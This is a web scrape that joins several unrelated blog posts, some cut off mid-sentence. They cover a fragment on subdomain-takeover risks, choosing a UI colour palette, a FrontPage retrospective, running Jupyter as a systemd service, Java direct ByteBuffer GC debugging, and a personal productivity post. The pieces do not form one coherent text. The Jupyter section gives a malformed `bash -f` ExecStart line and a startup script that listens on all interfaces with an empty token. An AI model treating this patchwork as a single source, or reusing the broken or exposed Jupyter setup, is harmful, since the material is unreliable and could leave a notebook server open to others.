<ul><li>Since a subdomain represents a part of the organization, a subdomain takeover can allow an attacker to serve malicious content or misguiding information and thus cause Brand Reputation loss, User Distrust and Negative PR.</li><li>It has <strong><a href="https://whitehatnepal.tumblr.com/post/149985438982/how-i-was-able-to-read-uber-logs-and-internal" target="_blank" rel="noreferrer noopener">previously come to light</a></strong> that internal emails can be actively intercepted just by claiming a simple webhook of the third-party service (e.g. <em>Sendgrid</em>) which an application might be using for email marketing.&nbsp;</li><li>OAuth whitelisting of a vulnerable subdomain might be a cause of trouble, because an attacker can …</li></ul></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
				<!--kg-card-begin: markdown--><p>In this series of articles, I will show full process of creating a UI design for <a href="https://play.google.com/store/apps/details?id=net.amortizedcost.batchimageshrinker">Batch Image Shrinker</a> (<a href="market://details?id=net.amortizedcost.batchimageshrinker">Google play link</a>) mobile application which I did by myself. As a software developer always I've been thinking that UI design is not for me, that it's complex and requires some art skill or something.</p>
<p>It's a myth and I will try to debunk it.</p>
<p>I will show you that UI design is for everyone, you just need to know some basic technics and a couple of tricks.</p>
<p>It's not going to be easy, but I promise you it will be very interesting.</p>
<h2 id="dominatingcolor">Dominating color</h2>
<p>With the dominating presence of dark-mode, I noticed that for me it was easier to work with darker colors as baseline colors than with brighter ones, and since  I almost always use dark-mode of the applications, so I wanted to have something similar in my application. I was certain that I didn't want to use <a href="https://colornames.org/color/3b5998">Facebook blue</a> color and it's successors, so I had to find something more futuristic and brave than that. My choice fell on <code>#464d77</code> which is a very intense dark blue, almost purple color.</p>
<p><img src="http://amortizedcost.net/content/images/2020/11/Screenshot-2020-11-17-at-20.10.09.png" alt="Screenshot-2020-11-17-at-20.10.09"></p>
<p>Common advice here will be not to use pure black or white colors, which, as perfectly described in <a href="https://ianstormtaylor.com/design-tip-never-use-black/">the article</a>, hardly present in the real-world color pallet. <em>What a coincidence, I found <a href="https://lawsofux.com/aesthetic-usability-effect.html">a website</a> with a perfect example of dark background color and great content to read.</em></p>
<h2 id="colorpalette">Color palette</h2>
<p>Of cause, just one baseline color will not be enough to build a feature-rich application. You will need a couple of colors for different types of components like buttons, checkboxes, radio buttons, etc. Another one or two colors will be needed for the text itself. Also,  some gradients for several states of a component, such as "active", "disabled", "pressed". So before creating an actual UI, we will need to have a rich pallet of colors to work with. In my case, I ended up with 6 colors in total which was more than enough to create a simple yet interesting UI.</p>
<p>This step is much easier than the previous one, because here we will be either reusing or generating new color pallets using the baseline color from the previous part.</p>
<p>The generator which I was using is <a href="https://coolors.co/palettes/popular/f9db6d">this</a>. Here you could either put the color hex into a search bar or simply choose the pallet from the <a href="https://coolors.co/a1e8af-94c595-747c92-372772-3a2449">hundreds</a> of pre-generated ones. If the color range is not enough for you, try to extend it with <a href="https://learnui.design/tools/data-color-picker.html#palette">another</a> good palette generator. Put on the left side the baseline color and select how many colors you will need.</p>
<p>Pro-tip, you can combine those tools to get even more combinations. As you can see here, I was using a baseline color on the right side and colors from <a href="https://coolors.co/464d77-36827f-f9db6d-f4eded-877666">the palette</a> as values for the right side of the generator:</p>
<p><img src="http://amortizedcost.net/content/images/2020/11/Screenshot-2020-11-16-at-23.50.31.png" alt="Screenshot-2020-11-16-at-23.50.31"><br>
<img src="http://amortizedcost.net/content/images/2020/11/Screenshot-2020-11-16-at-23.51.04.png" alt="Screenshot-2020-11-16-at-23.51.04"></p>
<p>If you are not satisfied with the results try to get back to choosing the baseline color and repeat the whole process again. Since we are learning it's ok to do multiple roundtrips until your gut feelings tell you that that is it.</p>
<p>Once we are done with the color schema we are good to go to we move to the next step - choosing fonts, which will be covered next time.</p>

	<p>PLEASE don't use FrontPage for modern web development! It's filled with security vulnerabilities and obsolete standards. The goal of this is not to convince you otherwise. The newest version came out almost two decades ago!</p>

<p>Microsoft FrontPage. The mere mention of that name is making most (if not all) of you seasoned web devs groan. "FrontPage was utter rubbish from dark ages of GeoCities" you say. "Everything it touched was ruined with horrific output and proprietary nonsense!" And yes, it was.</p>
<p>But... FrontPage as a concept. As a dream of what could have been, and a window into what <em>was</em>. Letting the typical home user at the time create websites, express creativity, and conquer the world by storm, all without being forced to learn HTML or CSS or JavaScript... In that regard, FrontPage couldn't be beat.</p>
<p>Let's talk about why Microsoft FrontPage was for a brief period of time the ultimate content creation tool of the Internet, and why it later fell from grace.</p>
<h2>History</h2>
<p>Before we can talk about goodness and ugliness, we need to talk about carphones and business meetings. Because this was 1994, when the Internet was still really new. At that point in time most internet chatter occured on Usenet groups (think something like Reddit) or BBS systems (think something like <a href="https://invisibleup.com//articles/5/">old AOL</a>; example pictured below). If you needed buisness stuff, like stocks or the such, you had to log onto the BBS of whoever had what you needed. This was kind of a pain.</p>
<p><img alt="A picture of a BBS (tilde.town) as of today" src="https://invisibleup.com//articles/33/BBS.png"></p>
<p>Enter Randy Forgaard and Charles H. Ferguson. Ferguson, renowned computer industry consultant, contacted MIT graduate Forgaard (over carphone, in case you were wondering) to discuss starting a new, internet-based company.</p>
<p>His idea was that many corporations such as the Dow Jones, Bloomberg, Apple, etc. were sinking millions into building their own, completely incompatible dial-in Internet services. Therefore, they should create a standardized, completely open server/client combo to replace all the independent efforts. This hopefully would reduce the cost of development for those corporations, and provide a market for growth by making buisnesses <em>want</em> to have an Interent presence.</p>
<p>The two decided to found their own company, Vermeer Technologies, Inc. A month later, still in the planning stages, they caught wind of the brand new World Wide Web out of CERN. It was decentralized, open, and even more robust than they were planning. It was just about perfect. The only issue was that it was rather a pain to make websites if you were just some lowly advertising manager or whoever. The web needed an authoring tool for websites.</p>
<p><img alt="FrontPage 1.0a, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-1.0.png"></p>
<p>So, somehow, they managed to hire many professional coders for no salary whatsoever to work on FrontPage. (Early start-up culture, perhaps?) Evidently it worked, as FrontPage was released (only!) a week behind schedule on October of 1995. By then the World Wide Web was exploding, with a 20% increase in sites <em>per month</em>. FrontPage also managed to explode, receiving many awards and positive reviews. In fact, it was so good that Microsoft ended up buying them out. According to them, not only did it feel like a native Office application, it was perfect for their ongoing plan to become more internet centric.</p>
<p><img alt="FrontPage 97, taken from WinWorldPC.com" src="https://invisibleup.com//articles/33/FP-97.png"></p>
<p>FrontPage over the years got integrated into the Office suite and made a flagship product for Microsoft productivity products. By Office 2000, FrontPage had more Office integration than you should shake a stick at; nailing down the Office user interface and allowing imports and exports across the whole suite. There's... other stuff as well, but let's stay positive for now.</p>
<p>I'll be covering FrontPage 2002, as that's the version I own, and the one I have the most experience with.</p>
<h2>The Good</h2>
<p>The interface... is (in my opinion) one of the best interfaces for any program ever. No hyperbole. I think only the other Microsoft applications of the era like PowerPoint and Visio can top it. I can <em>see</em> why it won awards.</p>
<p><img alt="FrontPage's start screen with no webs open" src="https://invisibleup.com//articles/33/FP-Start.png"></p>
<p>Like any other Microsoft Office XP program, there's the sidebar on the right with common tasks. What you'll probably want to do is, of course, make a new site.</p>
<p>FrontPage's equivalent to "projects" are called "Webs". These Webs contain the files (all your HTML, CSS, images, etc.) and preferences (such as which web server to sync up with or what compatibility settings to use) for that website.</p>
<p><img alt="FrontPage's template selector" src="https://invisibleup.com//articles/33/FP-NewWeb.png"></p>
<p>Start by selecting a new "Empty Web". Up pops a bunch of templates, including the "Empty Web" template. A bit odd, but sure.</p>
<p><img alt="The &quot;Personal Homepage&quot; template in action" src="https://invisibleup.com//articles/33/FP-Template.png"></p>
<p>If you <em>were</em> to choose a template, it would give you a pre-populated fill-in-the-blanks site ready for your words and pictures. It takes some of the layout work and design originality out of it, but that <em>is</em> the purpose of a template after all. (Although, as a word of advice, <em>don't use these.</em> They're rather awfully designed from a web standards point of view. You can see it barely fitting in my window there. Imagine that on a smartphone.)</p>
<p><img src="https://invisibleup.com//articles/33/FP-BlankWeb.png" alt="FrontPage open to a new blank web. Folder list and Views bar are visible."></p>
<p>Anyways, once you open your blank web, you get... nothing! (That's what you asked for, isn't it?) No worries. Really, if you think about it, it would be rather silly to start making a page off the bat. You see, FrontPage takes a <em>project oriented</em> approach to things. While you easily <em>could</em> just sit down and start banging stuff out, that's really not the way FrontPage wants you to go.</p>
<p><img alt="FrontPage Navigation editor with some pages created and linked up." src="https://invisibleup.com//articles/33/FP-NavView.png"></p>
<p>Here's probably my favorite FrontPage feature: the Navigation editor. Here you create blank pages and link them together in a logical hierarchy. This closely resembles the process you'd usually take on paper when designing a website.</p>
<p><img alt="Navigation bar settings dialog" src="https://invisibleup.com//articles/33/FP-Navbar.png"></p>
<p>With this hierarchy, you can automatically create a navigation bar in all your pages that are properly linked. If you decide to make a new top-level page, for instance, every page on your site will be updated to feature that page. (To replicate that feature on this site, I had to use some pretty tricky template scripting with my custom Flask server. I'd vastly prefer something like this.)</p>
<p>This feature is also nice because it forces you to <em>think about your site</em>. You can't just sit down like it's Microsoft Word and bang out some pages. You need a coherent plan. Before you can even start, you need to sit down with your client/team/self and ask "What do you want on your website?" To most people it's obvious that you need a website. Everybody has a website. What's significantly less obvious is <em>what</em> needs to be on the website. And FrontPage's web editor allows you to play around with hierarchies and layouts before commiting to anything.</p>
<p><img alt="PowerPoint Slide Sorter mode&quot;" src="https://invisibleup.com//articles/33/PPT-SlideSorter.png"></p>
<p>One thing that's intersting is that Word, PowerPoint and Access all (vaguely) follow a similar model. Word has the Outline editor, PowerPoint has the Slide Sorter mode (pictured above, showing an interactive game I made when I was 11), and Access, being a typical database program, requires you to declare your tables before you can work on them.</p>
<p>What's even more interesting is that, with the exception of Access (which not many people used, mostly due to its cost and relative rarity), you were never <em>required</em> to have a plan before starting. Most people I've seen use Word just do straight typing, or perhaps work off another document with an outline. But the option was there! One could do their outline <em>in their document</em> and flesh out around that. Likewise with PowerPoint, as well.</p>
<p><img alt="Highlighted template include code" src="https://invisibleup.com//articles/33/FP-TemplateInclude.png"></p>
<p>Another common task in web design is defining a "template" page where you fill all your content into. For example, every page on this site you're reading on now has the same header and footer, and every article has the same sort of thumbnail image at the top. That was all scripted using template features.</p>
<p>FrontPage, being an Office product, supports templates. The implementation admittedly is <em>super</em> janky, but it's there. You can include pages within other pages just fine, it's just a little tricky to set up. (FYI, Word, Excel, and PowerPoint do templates too. It's one of their lesser-known features, IMHO.)</p>
<p><img alt="Report view window" src="https://invisibleup.com//articles/33/FP-Reports.png"></p>
<p>Another really neat feature: reports. Like a compiler in an IDE, FrontPage produces warnings, errors, and statistics for your site. At a glance I can view all broken links, orphaned pages, oversized images, etc. This is a <em>fantastic</em> feature, something that modern web dev software just <em>doesn't</em> have.</p>
<p><img alt="Hyperlinks view window" src="https://invisibleup.com//articles/33/FP-Links.png"></p>
<p>In the same vein as the Reports, you can see at a glance what links to what. It's a lot like the call chart in a software development IDE. I can see quickly every site linked from any page (shown here is <a href="https://invisibleup.com//articles/24/">the Sonic R color fix article</a>) and any subpages.</p>
<p><img alt="Tasks view, showing a task labeled &quot;Write FrontPage article&quot;" src="https://invisibleup.com//articles/33/FP-Tasks.png"></p>
<p>Last feature, although this isn't nearly as useful in the year 2020. In the tasks view, you can put up a list of tasks that needs to be accomplished. Already that seems rather nice for keeping track of what you need to do. It's a lot like GitHub or GitLab's issue tracker, in a sense.</p>
<p>However, if you connect to a server with FrontPage Web Extensions (I'll get to that...), you can share this task list with other people. You can (again, like an issue tracker) put up a task to be done by someone else and work on a task that somebody else put up. It's a <em>very</em> nice feature for web development, but nowadays this is normally handled by source control providers like GitHub or GitLab.</p>
<p><img alt="FrontPage editing the Sonic R color mod article" src="https://invisibleup.com//articles/33/FP-Editor.png"></p>
<p>And, of course, there's the webpage editor. This works almost exactly like Microsoft Word, with some web-flavored spice. You type words and they appear in the page. You make those words blue, they're blue. <em>That said</em>, when you edit elements like that, it inserts an HTML 3.2 style <code>&lt;FONT&gt;</code> tag instead of trying to match it to a CSS rule. There's ways around this, but you have to be very diligent in doing so. This is mostly just due to FrontPage being a product of its time, though.</p>
<p>FrontPage is a program about planning, executing, and reviewing. Take the Navigation editor. You plan out the content of your site. You sketch up the layout. Then you reflect on if your layout matches your requirements. Or the Reports. Create content, check reports. Or the Tasks. Plan out what you need to do, do that, and then check if the task is complete. That, right …</p></article></div>

    <p><img src="https://janakiev.com/assets/jupyter_systemd_files/Activiteit_in_de_controle_kamer_in_de_Tap-Line_olie_terminal_nabij_Saida,_Bestanddeelnr_255-6308.jpg"></p>
  <p><span>10 Nov 2020</span></p><p>In this article you will see how to easily manage <a href="https://jupyter.org/">Jupyter</a> Notebook and <a href="https://jupyterlab.readthedocs.io/en/stable/">JupyterLab</a> by using the <a href="https://janakiev.com/blog/jupyter-systemd/systemd.io">Systemd</a> tooling. This is useful when you want to have an instance running local or on your server that you can manage and monitor.</p>

<p>What is Systemd and why do we need it? Systemd is an <a href="https://en.wikipedia.org/wiki/Init">init</a> system in Linux used for system intialization and service management. This allows services configured for Systemd to manage and monitor them. This way, you can check if the service is still running, you can set it to automatically restart, you monitor the outputs of the service, and much more. To add Jupyter as a service we have to create a unit file. Let’s have a look how that works.</p>



<p>Systemd uses unit files as its primary way to manage and configure system resources. These files are in the <a href="https://en.wikipedia.org/wiki/INI_file">INI</a> file format and are stored in <code>/etc/systemd/system</code>.</p>

<p>But before we start, we have to configure a password for Jupyter. Typically when running Jupyter, it would open a window in your browser with a generated token. In this case it will run in the background as a service and you would need to use a password. This can be done by generating hashed password and salt for use in notebook configuration with:</p>

<div><div><pre><code>python <span>-c</span> <span>"from IPython.lib.security import passwd; print(passwd('PASS'))"</span>
</code></pre></div></div>

<p>Which should give you a hash like this one:</p>

<div><div><pre><code>sha1:137775e93d29:ba64d3b78e089f0f779167242ddb080a05c42a84
</code></pre></div></div>

<p>For more information on security, have a read on <a href="https://jupyter-notebook.readthedocs.io/en/stable/security.html">Security in the Jupyter notebook server</a>. Great, now let’s continue to create a file with the name <code>jupyter.service</code> with the following contents:</p>

<div><div><pre><code><span>[Unit]</span>
<span>Description</span><span>=</span><span>Jupyter Notebook</span>

<span>[Service]</span>
<span>Type</span><span>=</span><span>simple</span>
<span>PIDFile</span><span>=</span><span>/run/jupyter.pid</span>
<span>ExecStart</span><span>=</span><span>/home/user/anaconda3/bin/python -m jupyter-lab --notebook-dir=/home/user/notebooks --no-browser --NotebookApp.password='sha1:137775e93d29:ba64d3b78e089f0f779167242ddb080a05c42a84'</span>
<span>User</span><span>=</span><span>user</span>
<span>Group</span><span>=</span><span>user</span>
<span>Restart</span><span>=</span><span>always</span>
<span>RestartSec</span><span>=</span><span>10</span>

<span>[Install]</span>
<span>WantedBy</span><span>=</span><span>multi-user.target</span>
</code></pre></div></div>

<p>Each file has a few sections and each section like <code>[Unit]</code>, <code>[Service]</code>, and <code>[Install]</code> have various <a href="https://www.freedesktop.org/software/systemd/man/systemd.directives.html">directives</a> that are used to configure a service. Most of them should already give a hint on what they are used for, but we will quickly go through some of them. To read more into detail how this works have a look at the tutorial <a href="https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files">Understanding Systemd Units and Unit Files</a>.</p>

<p>The most important one here is the <code>ExecStart=</code> directive, which specifies the command to be run. It is important to note, that only absolute paths should be used and that the <code>ExecStart=</code> directive has to be written in one line. In this case the unit files uses JupyterLab that is installed in the Anaconda base environment. If you use virtualenv instead, change the directive for <code>ExecStart=</code> to:</p>

<div><div><pre><code><span>ExecStart</span><span>=</span>/bin/bash <span>-f</span> <span>"source /home/user/notebooks/bin/activate; jupyter-lab --notebook-dir=/home/user/notebooks"</span>
</code></pre></div></div>

<p>The <code>PIDFile=</code> directive specifies where the process identification number is stored. Make sure to have your user and group in the <code>User=</code> and <code>Group=</code> directives. The <code>Restart=</code> directive specifies if the service should be restarted when the service exits, is killed or a timeout is reached. <code>RestartSec=</code> specifies how long it should wait until the service will be then restarted.  You can read more about the directives in the <a href="https://www.freedesktop.org/software/systemd/man/systemd.directives.html">documentation</a>.</p>

<p>If you use more configuration and want to have it in a bash script instead, you can create a script like the following:</p>

<div><div><pre><code><span>#!/bin/bash</span>
/home/nikolai/anaconda3/bin/jupyter-lab <span>\</span>
  <span>--notebook-dir</span><span>=</span>/home/user/notebooks <span>\</span>
  <span>--ip</span><span>=</span><span>'*'</span> <span>\</span>
  <span>--port</span><span>=</span>8888 <span>\</span>
  <span>--NotebookApp</span>.token<span>=</span><span>''</span> <span>\</span>
  <span>--NotebookApp</span>.password<span>=</span><span>'sha1:137...'</span> <span>\</span>
  <span>--no-browser</span>
</code></pre></div></div>

<p>Then, replace the previous <code>ExecStart</code> with <code>ExecStart=/path/to/script.sh</code> in the unit file. Also, make sure to make it executable with <code>chmod +x /path/to/script.sh</code>.</p>

<p>Finally, instead of using the argument <code>--notebook-dir</code>, you can specify the working directory by using the <code>WorkingDirectory=</code> directive.</p>



<p>First, move the unit file to <code>/etc/systemd/system/</code> with:</p>

<div><div><pre><code><span>sudo mv </span>jupyter.service /etc/systemd/system/
</code></pre></div></div>

<p>Then, reload the systemd manager configuration with:</p>

<div><div><pre><code><span>sudo </span>systemctl daemon-reload
</code></pre></div></div>

<p>Next, enable the service to start at boot with:</p>

<div><div><pre><code><span>sudo </span>systemctl <span>enable </span>jupyter
</code></pre></div></div>

<p>To start the Jupyter service, you need to type:</p>

<div><div><pre><code><span>sudo </span>systemctl start jupyter
</code></pre></div></div>

<p>To check its status, you can type:</p>

<div><div><pre><code><span>sudo </span>systemctl status jupyter
</code></pre></div></div>

<p>Finally, you can monitor the outputs of the service with <code>sudo journalctl -u jupyter -f</code>. To show the log messages since the last boot (<code>-b</code>) and without additional fields like timestamp and hostname (<code>-o cat</code>), type:</p>

<div><div><pre><code><span>sudo </span>journalctl <span>-u</span> jupyter <span>-b</span> <span>-o</span> <span>cat</span> <span>-f</span>
</code></pre></div></div>

<p>This should show you a similar output to the following output:</p>

<div><div><pre><code>Started Jupyter Notebook.
[I 18:54:36.878 LabApp] JupyterLab extension loaded from /home/user/anaconda3/lib/python3.7/site-packages/jupyterlab
[I 18:54:36.879 LabApp] JupyterLab application directory is /home/user/anaconda3/share/jupyter/lab
[I 18:54:36.880 LabApp] Serving notebooks from local directory: /home/user/notebooks
[I 18:54:36.880 LabApp] The Jupyter Notebook is running at:
[I 18:54:36.880 LabApp] http://0.0.0.0:8888/
</code></pre></div></div>

<p>This really useful if you need to have a look at what Jupyter logs out since some errors and logs are not visible within the notebooks. For more useful commands and arguments have a look at this <a href="https://janakiev.com/blog/systemd-cheatsheet/">Systemd cheatsheet</a>.</p>



<p>Now, you should be able to manage and monitor your Jupyter service with Systemd. To learn how to install and configure Jupyter on a server including SSL/TLS, have a look at my previous guide on <a href="https://janakiev.com/blog/jupyter-notebook-server/">Installing and Running Jupyter Notebooks on a Server</a>  Here are a few further resources when working with systemd:</p>

<p>Hi, folks!</p>
<p>Every single program allocates memory. Byte buffers are at the core of many essential libraries which power the services the modern internet is built upon. If you’re building such a library, or even just copying data between different files, chances are you’ll need to allocate a buffer.</p>
<p>In Java, <code>ByteBuffer</code> is the class that allows you to do so. Once you’ve decided to allocate a buffer, you’ll be presented with two methods <code>allocate()</code> and <code>allocateDirect()</code>. Which one to use? The answer is, as always, it depends. If there were no tradeoffs, there wouldn’t be two methods. In this article, I’ll explore some of these tradeoffs, demystify this behaviour, and I hope that the answer will be clear for you by the end of it.</p>

<h3 id="_two_buffers">Two buffers</h3>
<p>At first glance, the two methods <code>allocate()</code> and <code>allocateDirect()</code> are very simple. The <code>allocate()</code> allocates a buffer in the managed heap of the Java process, a part of this exact space which size is specified with the <code>Xmx</code> option. The <code>allocateDirect()</code> method allocates a buffer residing outside of the managed heap.</p>
<p><span><img src="https://serce.me/img/allocatedirect/server3.png" alt="server3"></span></p>
<p>This difference, however, creates a number of significant runtime implications, which I’m going to dive into here. But first, let me start by telling a debugging story where direct byte buffers were the murderer.</p>
</div>
<div>
<h3 id="_the_story">The story</h3>
<p>Every story needs a protagonist. In this case, the protagonist was a Java application built on top of RSocket, a modern application protocol. Here’s the oversimplified version of the app which you can find on <a href="https://github.com/SerCeMan/allocatedirect/blob/master/src/main/java/me/serce/allocatedirect/Main.java">Github</a>. Let’s call this app an echo app. The echo code isn’t trying to do anything complicated, it is a simple echo service built with an awesome <a href="https://github.com/rsocket/rsocket-java">rsocket-java</a> library. All it does is spins up a client and a server, where the client sends messages, and the server echoes them back.</p>
<div>
<div>
<pre><code data-lang="java">var server = RSocketServer.create(echo) //...
var client = RSocketConnector.create() //...
while (true) {
  assert Objects.equals(client.send(), client.receive())
}</code></pre>
</div>
</div>
<div>

All measurements were taken on an EC2 AWS <a href="https://aws.amazon.com/ec2/instance-types/m5/">m5.large</a> instance. Unless specified otherwise, <em>Java 13</em> is used. The point of this article is not to show the numbers but rather demonstrate the techniques that you can use to debug your own application.

</div>
<p>The code is useless if it’s just sitting in the repo and doing nothing, so let’s clone the repo and start the app.</p>
<div>
<div>
<pre><code data-lang="bash">git clone https://github.com/SerCeMan/allocatedirect.git
cd allocatedirect &amp;&amp; ./start.sh</code></pre>
</div>
</div>
<p>The app starts, and you should see that the logs are flowing. As expected, now it’s processing a large number of messages. However, if the echo app was exposed to users, they would start noticing significant pauses every now and then. All Java developers know that the first thing to look at in the case of spurious pauses is GC.</p>
<div>
<table>
<tbody><tr>
<td>
<p>Note</p>
</td>
<td>
You can find GC logs of the app are stored in <code>/tmp/${gcname}</code>. The example logs for each run are also available in the <a href="https://github.com/SerCeMan/allocatedirect/tree/master/logs">repo</a>. In this article, gceasy.io was used for visualisation. It’s a great free online tool which supports the log format of multiple garbage collectors. Even though you can always visualise GC logs using a tool like gceasy, as we’ll see later, the raw logs often contain a lot more information than most of the tools can display.
</td>
</tr>
</tbody></table>
</div>
<p>Indeed, GC logs show that GC is to blame here. The application is running under G1, which is the default collector since JDK 9. There are multiple young GC pauses on the graph. Young GC is a stop-the-world pause in GC in G1. The application stops completely to perform a cleanup. For the echo server, the graph shows multiple young GC pauses that last for 100-130ms and occur every 10 seconds.</p>
<div>
<p>G1 GC</p>
<p><span><img src="https://serce.me/img/allocatedirect/g1before.png" alt="g1before"></span></p>
</div>
<p>Luckily for us, in the last few years, there has been an amazing development in the GC space. There are not just one but two new fully concurrent garbage collectors, <a href="https://wiki.openjdk.java.net/display/zgc/Main">ZGC</a> and <a href="https://wiki.openjdk.java.net/display/shenandoah/Main">Shenandoah</a>.</p>
<p>While I’ve had <a href="https://twitter.com/SerCeMan/status/1246676501925224449">great success</a> with ZGC before, Shenandoah has a great advantage of being much friendlier to application memory consumption. Many applications, especially simple JSON in, JSON out stateless services are not memory-constrained. Some application, on the other hand, especially the ones that process a large number of connections might be very sensitive to memory usage.</p>
<p>Even though the echo app only has a single client and a server in its current state, it could as well handle tens of thousands of connections. It’s time to enable Shenandoah, and run the echo app again.</p>
<div>
<div>
<pre><code data-lang="bash">./start.sh shen # starts with -XX:+UseShenandoahGC</code></pre>
</div>
</div>
<p>After enabling Shenandoah, the GC logs start showing an interesting picture. There is definitely a huge improvement in the pause frequency. The pauses now only occur every minute or so. However, the pauses are still around 90ms long, which is far away from the desired sub-millisecond pauses.</p>
<div>
<p>Shenandoah GC</p>
<p><span><img src="https://serce.me/img/allocatedirect/shenandoah.png" alt="shenandoah"></span></p>
</div>
<p>Now that the symptoms are clear, and the problem is reproducible, it’s time to look at the cause. GC graphs don’t show much more information. Looking at the raw logs directly, on the other hand, reveals the cause which is clearly stated right on the pause line.</p>
<div>
<div>
<pre><code data-lang="log">...
[info][gc] GC(15) Pause Final Mark (process weakrefs) 86.167ms
...</code></pre>
</div>
</div>
<p>Turns out, weak references are to blame. Put simply, weak references are a way to keep an object in memory until there is a demand for this memory. Large in-memory caches is a common use-case for weak references. If there is enough free heap, a weak reference cache entry can stay there. As soon as GC figures out that there is not enough memory, it’ll deallocate weak references. In most of the cases, this is a much better outcome than the application failing with an out of memory exception because of a cache.</p>
<p>A frantic search across the repository doesn’t show any usages of weak, soft or phantom references. Not even the search through the third party libraries can show anything. After staring at the metrics for a while, one of the graphs gives a clue! The long GC pauses correlate with a sudden drop in the number of direct byte buffers.</p>
<div>
<p>GC vs DirectByteBuffer count</p>
<p><span><img src="https://serce.me/img/allocatedirect/jmc-gc.png" alt="jmc gc"></span></p>
</div>
<div>
<table>
<tbody><tr>
<td>
<p>Note</p>
</td>
<td>
You can get a similar graph by running the echo app and connecting to the JMX port. For this screenshot, I used Java Mission Control (JMC). The <a href="https://github.com/SerCeMan/allocatedirect/blob/master/start.sh#L53">start.sh</a> script contains the options that you can enable to connect to an app with JMX remotely.
</td>
</tr>
</tbody></table>
</div>
<p>At first, the correlation might not make any sense. Byte buffers are not weak references, are they? They are not weak references themselves. However, you might notice, that creating a new direct byte buffer gives you back a plain <code>ByteBuffer</code> interface which doesn’t have a <code>close</code> method or any other way of deallocating the buffer.</p>
<div>
<div>
<pre><code data-lang="java">ByteBuffer buf = ByteBuffer.allocateDirect(42);</code></pre>
</div>
</div>
<p>The underlying buffer needs to go away once the last reference to this buffer goes away. The modern API for this in Java is <a href="https://docs.oracle.com/en/java/javase/13/docs/api/java.base/java/lang/ref/Cleaner.html"><code>java.lang.ref.Cleaner</code></a>. As we can see, it’s exactly what <code>DirectByteBuffer</code> class uses to determine when the underlying buffer should be deallocated.</p>
<div>

<div>
<pre><code data-lang="java">DirectByteBuffer(int cap) {
    // ...
    base = UNSAFE.allocateMemory(size); // malloc call
    UNSAFE.setMemory(base, size, (byte) 0);
    // ...
    cleaner = Cleaner.create(this, new Deallocator(base, size, cap));
}</code></pre>
</div>
</div>
<p>Yet, there are no usages of direct buffers in the code of the echo app either, so how could we find them? One way would be to search through the third party libraries using IntelliJ. The approach would work very well for the echo example but would completely fail for any real applications of a decent size. There are just way too many places where byte buffers are used. Looking at the graphs, one can notice that the number of created buffers per minute is huge, literally millions of them.</p>
<p>Instead of searching through the code to find all byte buffer references, it is easier to find the place at runtime. One way to find out where the majority of the buffers is created is to fire up the async profiler and profile the <a href="https://man7.org/linux/man-pages/man3/malloc.3.html"><code>malloc</code></a> calls which are used by direct buffers to allocate memory.</p>
<div>
<div>
<pre><code data-lang="bash"># async profiler can be downloaded from https://github.com/jvm-profiling-tools/async-profiler
./profiler.sh -d 30 -f /tmp/flamegraph.svg $(pgrep -f java) -e malloc</code></pre>
</div>
</div>
<p>While running, the profiler managed to sample more than 500000 malloc calls which non-ambiguously show where all of the buffers were created from.</p>

<div>
<table>
<tbody><tr>
<td>
<p>Note</p>
</td>
<td>
The flame graph above visualises the code paths where most of the captured malloc calls occur. The wider the column is, the larger the number of times the code path appeared in the sample. This graph, as well as other flame graphs in this article, is clickable. You can read more on how to read flame graphs <a href="http://www.brendangregg.com/flamegraphs.html">here</a>.
</td>
</tr>
</tbody></table>
</div>
<p>As it turned out, there was a place in the code which was using direct buffers. With this rich knowledge of where exactly the direct buffer allocations occur, creating a fix is easy. All that’s needed is to make a one line change and to replace <code>allocateDirect</code> with <code>allocate</code> and send a <a href="https://github.com/rsocket/rsocket-java/pull/945">PR upstream</a>.</p>
<p>Running the same app on shenandoah after applying the single line change produces a completely different graph which pleases the eyes with sub-millisecond GC pauses.</p>
<div>
<p>Shenandoah GC</p>
<p><span><img src="https://serce.me/img/allocatedirect/shenandoah-heap.png" alt="shenandoah heap"></span></p>
</div>
</div>
<div>
<h3 id="_the_costs">The costs</h3>
<p>The story revealed a dark side of direct byte buffers. If there is a dark side, there must be a bright side as well! There is. But before we look at the bright side, we need to explore a few more sides which also appeared to be grey.</p>
<div>
<h4 id="_allocations">Allocations</h4>
<p>Previously, we’ve observed implicit deallocations costs, so now it’s time to take a look at allocations. Could direct buffers be much cheaper to create? After all, going off-heap has been a performance trend for a while. A small benchmark can help to estimate the costs.</p>
<div>

<div>
<pre><code data-lang="java">@Param({"128", "1024", "16384"})
int size;

@Benchmark
public ByteBuffer heap() {
 …</code></pre></div></div></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blog">
                    <h2>Battling with yourself</h2>
<p>I have been building a very simple project that should off taken me 2 weeks max to build, for nearly 2 months.</p>
<p>The main reason is that I don’t have a proper structure to build it. This is my first time doing SaaS, and it has been like torture figuring out databases, ways to display content from the database, javascript integration with Django, and storing data from user forms into a database.</p>
<p>Every time starting to work on this project has felt like torture because it meant that I had to trial and error and google every single problem I had.</p>
<p><img alt="how do I even google this" src="https://i.gyazo.com/e7e75a06fe315f3e4315e9ec5f0c3b5c.png"></p>
<h2>How I forced myself to keep going</h2>
<p>I have a daily task that I need to do, that involves pushing a commit each day. As long as I did one, the task is complete.</p>
<p>When I was making this website for the blog that you are reading, it was straightforward to do, and I had 5-6 <strong>big</strong> commits daily. As soon as I opened my code editor, I would know what to change and do and how to do it. I was working productively, and every day I improved something.</p>
<p>This project is different. I have no idea what I need to do, and there is no particular vision that I have for it. One thing I know is that it needs to be done and be out in the open as soon as possible. The problem is, I have to spend 5 hours getting a single foreign key field to display.</p>
<p>I had no idea how to deal with this hard project before I started going through the daily notes that I write from the time I was coding this blog. One thing was transparent. I was hating working on this blog at that time as well. I also couldn’t figure out things and had to spend too much time on things that seemed too easy to spend even 10 minutes on.</p>
<p>Huh? Why do I remember it differently then?</p>
<h2>Finished project</h2>
<p>Once you have submitted a ready product that is working steadily and is solving some other peoples problems you automatically start focusing on other things, things that are not the core functionality or the structure of your project, but the usability and the UI/UX.</p>
<p>The part after the main release is very different from the main building phase. It requires you to understand and tweak the project in the ways to improve already existing experience, not invent what this experience should be in the begging.</p>
<h2>What has solved all of my problems:</h2>
<p>Trello kanban board.</p>
<p>It might seem stupid that I didn’t create one earlier, but I have around 100 Trello boards that I am in already! I thought that I didn’t need another board that just tracked nothing and did nothing. I thought that I could store everything in my head and each time gets on with it.</p>
